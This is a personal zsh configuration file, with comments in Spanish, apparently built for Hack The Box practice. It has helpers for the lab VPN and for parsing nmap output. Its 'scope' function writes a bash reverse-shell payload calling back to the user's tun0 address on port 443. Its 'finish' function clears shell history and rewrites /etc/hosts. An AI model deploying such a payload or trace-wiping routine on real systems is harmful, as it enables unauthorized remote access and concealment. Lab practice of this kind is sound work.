# ADD as ~/.zshrc
# Prompt
PROMPT="%F{red}[%f%F{cyan}$USER%f%F{red}]─[%f%F{green}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{yellow}$> %f"
# Export PATH$
export PATH=/home/kermit/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:PATH
# requiere de tener el script target.sh configurado
export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)

function xp()
{
  xclip -sel clip
}

function hex-encode()
{
  echo "$@" | xxd -p
}

function hex-decode()
{
  echo "$@" | xxd -p -r
}

function rot13()
{
  echo "$@" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

# alias
alias ls='ls -a --color=auto'
alias dir='dir --color=auto'
alias vdir='vdir --color=auto'
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'


source /home/kermit/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh
source /home/kermit/.zsh/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
source /home/kermit/.zsh/zsh-autocomplete/zsh-autocomplete.plugin.zsh
#####################################################
# Auto completion / suggestion
# Mixing zsh-autocomplete and zsh-autosuggestions
# Requires: zsh-autocomplete (custom packaging by Parrot Team)
# Jobs: suggest files / foldername / histsory bellow the prompt
# Requires: zsh-autosuggestions (packaging by Debian Team)
# Jobs: Fish-like suggestion for command history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
  source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
fi

##################################################
# Fish like syntax highlighting
# Requires "zsh-syntax-highlighting" from apt
if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
  source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
fi

if [ -f /usr/share/zsh-autocomplete/zsh-autocomplete.plugin.zsh ]; then
  source /usr/share/zsh-autocomplete/zsh-autocomplete.plugin.zsh
  # Select all suggestion instead of top on result only
  zstyle ':autocomplete:tab:*' insert-unambiguous yes
  zstyle ':autocomplete:tab:*' widget-style menu-select
  zstyle ':autocomplete:*' min-input 2
  bindkey $key[Up] up-line-or-history
  bindkey $key[Down] down-line-or-history
fi


#Colors

endcolor="\033[0m\e[0m"

green="\e[0;32m\033[1m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
negro="\e[0;30m\033[1m"
fondonegro="\e[0;40m\033[1m"
fondoverde="\e[0;42m\033[1m"
fondoamarillo="\e[0;43m\033[1m"
fondoazul="\e[0;44m\033[1m"
fondopurple="\e[0;46m\033[1m"
fondogris="\e[0;47m\033[1m"

function funciones(){
  echo -e "\n\t${blue}[+]${endcolor} ${green}htbvpn${endcolor} Ejecuta la VPN descargada en ${red}/descargas/firefox${endcolor}"
  echo -e "\n\t${blue}[+]${endcolor} ${green}rmk${endcolor} Borra totalmente"
  echo -e "\n\t${blue}[+]${endcolor} ${green}scope${endcolor} Crea un target y directorios de trabajo"
  echo -e "\n\t${blue}[+]${endcolor} ${green}finish${endcolor} Mata la VPN, sesion TMUX y borra directorios de trabajo" 
  echo -e "\n\t${blue}[+]${endcolor} ${green}xp${endcolor} Copia en la clipboard, ${red}ctrl + shift + v${endcolor} para pegar" 
  echo -e "\n\t${blue}[+]${endcolor} ${green}ports${endcolor} Muestra los puertos descubiertos de un archivo -oG de NMAP" 
  echo -e "\n\t${blue}[+]${endcolor} ${green}rot13${endcolor} Rota todos los caracteres 13 posiciones\n" 

}
#funciones
function htbvpn(){
sudo /usr/sbin/openvpn /home/kermit/Descargas/firefox/*.ovpn
}

function rmk(){
  scrub -p dod $1
  shred -zun 10 -v $1
}
function helpPanel(){
echo -ne "\n\t${red}[!]${endcolor} Es necesario especificar ambos parametros"
echo -ne "\n\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip"
echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre"
tput cnorm;

}
function scope(){

tput civis
declare -i counter=0; while getopts "i:n:h:" arg; do
    case $arg in
      i) ip_address=$OPTARG; let counter+=1;;
      n) nombre_maquina=$OPTARG; let counter+=1;;
      h) helpPanel;;
    esac
done
  
if [ $counter -eq 0 ]; then
  helpPanel
else
  echo -ne "\n\n\t${yellow}[?]${endcolor} Confirmando conexion VPN..."
  IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
fi
if [ "$IFACE" = "tun0" ]; then
  htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
  echo -ne "\n\n\t${green}[+]${endcolor} Conexion con VPN establecida"
  echo -ne "\n\n\t${green}[+]${endcolor} Ip de Hack the box: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
  echo -ne "\n\n\t${green}[+]${endcolor} Ip target: ${red}$ip_address ${endcolor}"

  echo "$ip_address" > /home/kermit/.config/bin/target.txt
  echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt

  echo "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo..."
  mkdir /home/kermit/maquinas/$nombre_maquina
  mkdir /home/kermit/maquinas/$nombre_maquina/content
  touch /home/kermit/maquinas/$nombre_maquina/scan
  touch /home/kermit/maquinas/$nombre_maquina/credentials
  touch /home/kermit/maquinas/$nombre_maquina/index.html
  chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
  cd /home/kermit/maquinas/$nombre_maquina
  echo "\n"
  lsd -la
  echo "\n\n"
  tput cnorm
else
  echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
  echo -ne "\n\n"
  tput cnorm
fi
}
# funcion iiixgxgstrackckcttt porrrtttsss
function ports(){
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
    echo -e "\n${red}[*]${endcolor} ${green}Extracting information...${endcolor}\n" > extractPorts.tmp
    echo -e "\t${red}[*]${endcolor} ${green}IP Address:${endcolor} $ip_address"  >> extractPorts.tmp
    echo -e "\t${red}[*]${endcolor} ${green}Open ports:${endcolor} $ports\n"  >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
    /usr/bin/bat extractPorts.tmp; /usr/bin/rm extractPorts.tmp
}
#Funcion para cerrar sesion
function finish(){
 
tput civis
  
# Borrando /descargas/firefox
rm -rf /home/kermit/Descargas/firefox/*
echo -ne "\n\n\t${yellow}[$]${endcolor} Borrando descargas..."
if [ -z "$(ls -A /home/kermit/Descargas/firefox/)" ]; then
  echo "\n\n\t${blue}[+]${endcolor} Borradas correctamente"
else
  echo "\n\n\t${red}[!]${endcolor} Error al borrar /Descargas/firefox"
fi

echo -ne "\n\t${blue}[+]${endcolor} Borrados archivos alterados"
sudo rm -rf /home/kermit/maquinas/$nombre_maquina
echo "" > /home/kermit/.zsh_history
echo "" > /home/kermit/.config/bin/target.txt
echo "" > /home/kermit/.config/bin/name.txt
echo "# Host addresses" > /etc/hosts
echo "#" >> /etc/hosts
echo "127.0.0.1  localhost" >> /etc/hosts
echo "127.0.1.1  parrot" >> /etc/hosts
echo -ne "\n\n\n" >> /etc/hosts
echo "::1        localhost ip6-localhost ip6-loopback" >> /etc/hosts
echo "ff02::1    ip6-allnodes" >> /etc/hosts
echo "ff02::2    ip6-allrouters" >> /etc/hosts
tput cnorm

# Matando la VPN 
echo -ne "\n\n\t${yellow}[$]${endcolor}Matando VPNs..."
sudo /usr/bin/killall openvpn &> /dev/null
IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':') &> /dev/null
if [ "$IFACE" == "tun0" ]; then
  echo -ne "\n\n\t${blue}[!]${endcolor} Error al matar las VPNs"
else
  echo -ne "\n\n\t${red}[+]${endcolor} VPNs finalizadas"
fi
echo -ne "\n\n"
tput cnorm
}

# Save type history for completion and easier life
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt appendhistory

# Useful alias for benchmarking programs
# require install package "time" sudo apt install time
# alias time="/usr/bin/time -f '\t%E real,\t%U user,\t%S sys,\t%K amem,\t%M mmem'"
# Display last command interminal
echo -en "\e]2;Parrot Terminal\a"
preexec () { print -Pn "\e]0;$1 - Parrot Terminal\a" }

[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
